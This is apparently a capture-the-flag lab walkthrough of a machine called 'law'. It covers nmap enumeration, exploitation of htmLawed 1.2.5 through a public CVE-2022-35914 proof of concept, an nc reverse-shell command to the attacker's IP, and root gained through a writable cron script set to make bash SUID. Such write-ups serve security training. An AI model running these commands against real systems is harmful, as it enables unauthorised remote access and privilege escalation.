---
icon: ubuntu
---

# law - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.190 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 18:48 EDT
Nmap scan report for 192.168.174.190
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: htmLawed (1.2.5) test
|_http-server-header: Apache/2.4.56 (Debian)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   29.05 ms 192.168.45.1
2   29.09 ms 192.168.45.254
3   29.12 ms 192.168.251.1
4   29.64 ms 192.168.174.190
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2216).png" alt=""><figcaption></figcaption></figure>

Upon visiting the page, the first thing that caught my sight was the version. I have not heard of HTMLAWED before, but I went straight to google to see if there is an exploit available and came acros this [**repo**](https://github.com/cosad3s/CVE-2022-35914-poc.git)&#x20;

```
git clone https://github.com/cosad3s/CVE-2022-35914-poc.git
```

```
python2 CVE-2022-35914.py -u http://192.168.174.190/index.php -c whoami
```

<figure><img src="../../.gitbook/assets/image (2217).png" alt=""><figcaption></figcaption></figure>

It works, I am going to get a reverse shell using nc, make sure you have a listener ready before running the following command:

```
python2 CVE-2022-35914.py -u http://192.168.174.190/index.php -c 'nc 192.168.45.158 80 -e /bin/bash'
```

<figure><img src="../../.gitbook/assets/image (2218).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">PSPY</mark>

<figure><img src="../../.gitbook/assets/image (2219).png" alt=""><figcaption></figcaption></figure>

Reveals a cronjob running in the background as root, www-data owns cleanup.sh let's change it to set the suid for bash so we can upgrade to root

<figure><img src="../../.gitbook/assets/image (2220).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2221).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2222).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2223).png" alt=""><figcaption></figcaption></figure>

The suid is set let's get root access

<figure><img src="../../.gitbook/assets/image (2224).png" alt=""><figcaption></figcaption></figure>

Root we are!
